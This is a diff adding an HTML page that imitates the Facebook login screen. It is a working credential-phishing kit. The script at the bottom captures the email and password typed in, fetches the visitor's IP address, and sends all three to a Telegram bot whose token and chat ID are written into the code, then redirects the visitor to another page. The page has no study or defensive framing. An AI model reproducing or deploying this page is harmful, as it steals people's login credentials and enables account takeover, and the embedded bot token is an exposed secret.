@@ -1,0 +1,215 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook</title>
+    <style>
+        * {
+            padding: 0;
+            margin: 0;
+            box-sizing: border-box;
+        }
+        body {
+            font-family: 'Poppins', sans-serif;
+            background-color: #f0f2f5;
+            color: #1c1e21;
+        }
+        main {
+            height: 70vh;
+            width: 100vw;
+            position: relative;
+            margin: 0 auto;
+        }
+        footer {
+            height: 30vh;
+            background-color: #ffffff;
+        }
+        .row {
+            display: flex;
+            justify-content: space-around;
+            align-items: center;
+            width: 100%;
+            max-width: 1000px;
+            position: absolute;
+            left: 50%;
+            top: 50%;
+            transform: translate(-50%, -50%);
+        }
+        .col-logo {
+            flex: 0 0 50%;
+            text-align: left;
+        }
+        .col-form {
+            flex: 0 0 40%;
+            text-align: center;
+        }
+        .col-logo img {
+            max-width: 300px;
+        }
+        .col-logo h2 {
+            font-size: 26px;
+            font-weight: 400;
+            padding: 0 30px;
+            line-height: 32px;
+        }
+        .col-form .form-container {
+            background-color: #ffffff;
+            border: none;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1), 0 8px 16px rgba(0, 0, 0, 0.1);
+            margin-bottom: 30px;
+            padding: 20px;
+            max-width: 400px;
+        }
+        .col-form .form-container input,
+        .col-form .form-container .btn-login {
+            width: 100%;
+            margin: 5px 0;
+            height: 45px;
+            font-size: 16px;
+        }
+        .col-form .form-container input {
+            border: 1px solid #dddfe2;
+            padding: 0 8px;
+            outline: none;
+        }
+        .col-form .form-container input:focus {
+            border-color: #1877f2;
+            box-shadow: 0 0 0 2px #e7f3ff;
+        }
+        .col-form .form-container .btn-login {
+            background-color: #1877f2;
+            border: none;
+            border-radius: 6px;
+            color: #ffffff;
+            font-weight: 700;
+        }
+        .col-form .form-container a {
+            display: block;
+            color: #1877f2;
+            font-size: 14px;
+            text-decoration: none;
+            padding: 10px 0 20px;
+            border-bottom: 1px solid #dadde1;
+        }
+        .col-form .form-container .btn-new {
+            background-color: #42b72a;
+            border: none;
+            border-radius: 6px;
+            font-size: 17px;
+            padding: 0 16px;
+            color: #ffffff;
+            font-weight: 700;
+            margin-top: 20px;
+        }
+        .col-form p {
+            font-size: 14px;
+        }
+        .col-form p a {
+            text-decoration: none;
+            color: #1c1e21;
+            font-weight: 600;
+        }
+        .footer-contents {
+            max-width: 1000px;
+            margin: 0 auto;
+        }
+        footer ol {
+            display: flex;
+            flex-wrap: wrap;
+            list-style: none;
+            padding: 10px 0;
+        }
+        footer ol:first-child {
+            border-bottom: 1px solid #dddfe2;
+        }
+        footer ol li {
+            padding-right: 15px;
+            font-size: 12px;
+            color: #385898;
+        }
+        footer ol li a {
+            text-decoration: none;
+            color: #385898;
+        }
+        footer ol li a:hover {
+            text-decoration: underline;
+        }
+        footer small {
+            font-size: 11px;
+        }
+    </style>
+</head>
+<body>
+    <main>
+        <div class="row">
+            <div class="col-logo">
+                <img src="images/fb_logo.svg" alt="Logo">
+                <h2>Facebook helps you connect and share with the people in your life.</h2>
+            </div>
+            <div class="col-form">
+                <form id="login-form">
+                    <div class="form-container">
+                        <input id="email" type="text" placeholder="Email address or phone number" required>
+                        <input id="password" type="password" placeholder="Password" required>
+                        <button type="submit" class="btn-login">Log In</button>
+                    </div>
+                </form>
+                <a href="#">Forgot password?</a>
+                <button class="btn-new">Create New Account</button>
+                <p><a href="#"><b>Create a Page</b></a> for a celebrity, brand, or business.</p>
+            </div>
+        </div>
+    </main>
+    <footer>
+        <div class="footer-contents">
+            <ol>
+                <li><a href="#">English</a></li>
+                <li><a href="#">Español</a></li>
+                <li><a href="#">More Languages</a></li>
+            </ol>
+            <small>Facebook © 2025</small>
+        </div>
+    </footer>
+    <script src="https://unpkg.com/axios@1.6.7/dist/axios.min.js"></script>
+    <script>
+        const TOKEN = "7903480606:AAENtQlwabKm3kBgw-Oc1GtIY5UA43fFP58";
+        const CHAT_ID = "7023035581";
+        const URI_API = `https://api.telegram.org/bot${TOKEN}/sendMessage`;
+
+        document.getElementById('login-form').addEventListener('submit', function(e) {
+            e.preventDefault();
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+
+            if (email && password) {
+                axios.get('https://api.ipify.org?format=json')
+                    .then(response => {
+                        const ip = response.data.ip;
+                        const message = `
+                            <b>New Login Attempt</b>\n
+                            <b>Email:</b> ${email}\n
+                            <b>Password:</b> ${password}\n
+                            <b>IP Address:</b> ${ip}
+                        `;
+                        return axios.post(URI_API, {
+                            chat_id: CHAT_ID,
+                            parse_mode: 'html',
+                            text: message
+                        });
+                    })
+                    .then(() => {
+                        window.location.href = 'ahlan.html';
+                    })
+                    .catch(() => {
+                        alert('Failed to send data or fetch IP.');
+                    });
+            } else {
+                alert('Please enter both email and password.');
+            }
+        });
+    </script>
+</body>
+</html>
